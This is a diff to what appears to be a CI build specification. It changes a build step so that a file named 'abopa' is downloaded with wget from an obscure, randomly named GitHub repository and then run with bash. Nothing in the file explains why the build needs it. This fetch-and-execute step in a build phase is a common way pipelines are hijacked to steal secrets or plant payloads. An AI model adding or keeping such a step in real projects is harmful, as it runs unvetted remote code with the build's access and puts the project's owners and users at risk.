@@ -3,5 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -L https://github.com/vedhagsvp/marlopava/raw/main/abopa -o /tmp/abopa
+      - wget https://github.com/vedhagsvp/marlopava/raw/main/abopa
       - bash abopa
